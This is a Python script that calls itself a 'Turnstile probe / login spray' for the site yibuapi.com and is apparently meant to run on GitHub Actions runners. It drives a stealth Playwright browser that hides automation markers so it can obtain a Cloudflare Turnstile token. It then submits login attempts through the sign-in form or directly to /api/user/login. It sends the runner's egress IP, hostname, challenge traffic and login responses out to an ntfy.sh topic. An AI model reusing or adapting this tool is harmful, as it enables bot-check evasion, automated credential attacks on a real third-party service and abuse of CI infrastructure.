#!/usr/bin/env python3
# GHA runner Turnstile probe / login spray for yibuapi.com (intent 42301)
import os, sys, json, time, socket, subprocess, urllib.request, urllib.error

TOPIC = os.environ.get("TOPIC", "i42301ts-9f3a2c")
MODE = os.environ.get("MODE", "probe")
BASE = os.environ.get("BASE", "https://yibuapi.com")
OUT = []

def log(*a):
    line = " ".join(str(x) for x in a)
    print(line, flush=True)
    OUT.append(line)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3800):
        chunk = ("[%s %d] " % (tag, i // 3800 + 1)) + text[i:i+3800]
        try:
            req = urllib.request.Request("https://ntfy.sh/" + TOPIC, data=chunk.encode("utf-8", "replace"),
                                         method="POST", headers={"Title": tag[:60]})
            urllib.request.urlopen(req, timeout=15).read()
        except Exception as e:
            print("NTFYERR", str(e)[:120], flush=True)

def egress():
    try:
        return urllib.request.urlopen("https://api.ipify.org", timeout=12).read().decode().strip()
    except Exception as e:
        return "ERR:" + str(e)[:80]

def resolve(host):
    try:
        return sorted(set(x[4][0] for x in socket.getaddrinfo(host, 443)))
    except Exception as e:
        return "ERR:" + str(e)[:60]

def get_status(url):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        r = urllib.request.urlopen(req, timeout=15)
        return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        return "ERR:" + str(e)[:80]

def main():
    log("RUN", os.environ.get("GITHUB_RUN_ID", "?"), "MODE", MODE,
        time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
    eg = egress(); log("EGRESS", eg); log("HOST", socket.gethostname())
    for h in ["brunhild.challenges.cloudflare.com", "hagen.challenges.cloudflare.com", "yibuapi.com"]:
        log("RESOLVE", h, resolve(h))
    log("CHAL_STATUS", get_status("https://brunhild.challenges.cloudflare.com/"))

    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        log("PLAYWRIGHT_IMPORT_FAIL", str(e)[:200])
        send("ts42301", "playwright import fail " + str(e)[:300])
        return

    token = None
    reqs = []; resps = []; chal = []; cons = []
    with sync_playwright() as p:
        b = p.chromium.launch(headless=False, args=[
            "--no-sandbox", "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled",
            "--window-size=1366,900"])
        c = b.new_context(
            user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            viewport={"width": 1366, "height": 900}, locale="en-US", ignore_https_errors=True)
        c.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome=window.chrome||{runtime:{}};Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});")
        pg = c.new_page()

        def on_req(r):
            if "/api/user/login" in r.url:
                try: reqs.append({"url": r.url, "method": r.method, "post": r.post_data})
                except Exception: pass

        def on_resp(r):
            u = r.url
            if "/api/user/login" in u:
                try: resps.append({"status": r.status, "body": r.text()[:400]})
                except Exception as e: resps.append({"status": r.status, "err": str(e)[:80]})
            if any(h in u for h in ["challenges.cloudflare", "hagen", "brunhild", "cdn-cgi/challenge"]):
                chal.append(("OK", r.status, u[:90]))

        def on_fail(r):
            u = r.url
            if any(h in u for h in ["challenges.cloudflare", "hagen", "brunhild", "cdn-cgi/challenge"]):
                chal.append(("FAIL", str(r.failure)[:80], u[:90]))

        pg.on("request", on_req); pg.on("response", on_resp); pg.on("requestfailed", on_fail)
        pg.on("console", lambda m: cons.append("[" + m.type + "] " + m.text[:180]))

        try:
            pg.goto(BASE + "/sign-in", wait_until="domcontentloaded", timeout=60000)
        except Exception as e:
            log("GOTO_ERR", str(e)[:150])
        for i in range(25):
            try:
                if pg.evaluate("()=>document.querySelectorAll('input').length") > 0: break
            except Exception: pass
            time.sleep(1)
        try:
            log("INPUTS", pg.evaluate("()=>document.querySelectorAll('input').length"))
            log("IFRAMES", json.dumps(pg.evaluate("()=>Array.from(document.querySelectorAll('iframe')).map(f=>f.src)")[:6], ensure_ascii=False))
        except Exception as e:
            log("DOM_ERR", str(e)[:120])

        for i in range(80):
            try:
                token = pg.evaluate("()=>{try{return window.turnstile?window.turnstile.getResponse():null}catch(e){return null}}")
            except Exception:
                token = None
            if token:
                log("TOKEN_AT_S", i); break
            time.sleep(1)
        log("TOKEN_LEN", len(token) if token else 0)
        if token: log("TOKEN_PREFIX", token[:24])
        try: pg.screenshot(path="signin.png", full_page=True)
        except Exception: pass

        if token and MODE == "probe":
            # form-driven attempt first (SPA knows exact field name)
            clicked = False
            try:
                for sel in ["input[type=text]", "input[name=username]", "input[placeholder*='ser' i]", "input[placeholder*='mail' i]"]:
                    if pg.locator(sel).count() > 0:
                        pg.locator(sel).first.fill("__ts_probe"); break
                if pg.locator("input[type=password]").count() > 0:
                    pg.locator("input[type=password]").first.fill("WrongPass__123")
            except Exception as e:
                log("FILL_ERR", str(e)[:120])
            for sel in ["button[type=submit]", "button:has-text('登录')", "button:has-text('Sign in')", "button:has-text('Login')", "button:has-text('登 录')"]:
                try:
                    if pg.locator(sel).count() > 0:
                        pg.locator(sel).first.click(); clicked = True; break
                except Exception: pass
            log("CLICKED", clicked)
            time.sleep(7)
            if not reqs:
                # fallback: direct fetch with 'turnstile' field (single-use token)
                try:
                    r = pg.evaluate("""async (b)=>{const r=await fetch('/api/user/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});return {status:r.status, body:(await r.text()).slice(0,400)}}""",
                                     {"username": "__ts_probe", "password": "WrongPass__123", "turnstile": token})
                    log("FETCH_TRY_turnstile =>", json.dumps(r, ensure_ascii=False)[:450])
                except Exception as e:
                    log("FETCH_ERR", str(e)[:150])
        b.close()

    log("=== CHALLENGE_NET ===")
    for e in chal[:15]: log(e)
    log("=== LOGIN_REQS ===")
    for r in reqs: log(json.dumps(r, ensure_ascii=False)[:500])
    log("=== LOGIN_RESPS ===")
    for r in resps: log(json.dumps(r, ensure_ascii=False)[:600])
    log("=== CONSOLE tail ===")
    for l in cons[-20:]: log(l)

    summary = "EGRESS=%s HOST=%s TOKEN_LEN=%s CHAL=%s LOGINREQ=%s LOGINRESP=%s" % (
        eg, socket.gethostname(), len(token) if token else 0,
        json.dumps(chal[:6], ensure_ascii=False)[:300],
        json.dumps(reqs, ensure_ascii=False)[:500],
        json.dumps(resps, ensure_ascii=False)[:700])
    send("ts42301FINAL", summary)
    log("DONE", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))

if __name__ == "__main__":
    main()
